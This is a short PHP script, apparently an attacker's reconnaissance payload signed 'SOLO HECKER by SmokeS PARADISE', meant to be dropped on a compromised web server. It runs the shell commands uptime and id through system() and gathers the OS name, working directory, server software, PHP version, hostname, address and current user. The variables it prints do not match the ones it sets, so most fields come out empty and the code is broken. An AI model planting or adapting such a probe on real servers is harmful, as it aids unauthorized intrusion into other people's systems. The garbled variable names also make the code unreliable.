<?
echo "SmokeS<br>";
$alb = @php_uname();
$alb2 = system(uptime);
$alb3 = system(id);
$alb4 = @getcwd();
$alb5 = getenv("SERVER_SOFTWARE");
$alb6 = phpversion();
$alb7 = $_SERVER['SERVER_NAME'];
$alb8 = gethostbyname($SERVER_ADDR);
$alb9 = get_current_user();
$os = @PHP_OS;
echo "os: $os<br>";
echo "uname -a: $smokes<br>";
echo "uptime: $smokes2<br>";
echo "id: $smokes3<br>";
echo "pwd: $smokes4<br>";
echo "user: $smokes9<br>";
echo "phpv: $smokes6<br>";
echo "SoftWare: $smokes5<br>";
echo "ServerName: $smokes7<br>";
echo "ServerAddr: $smokes8<br>";
echo "SOLO HECKER by SmokeS PARADISE<br>";
exit;
?>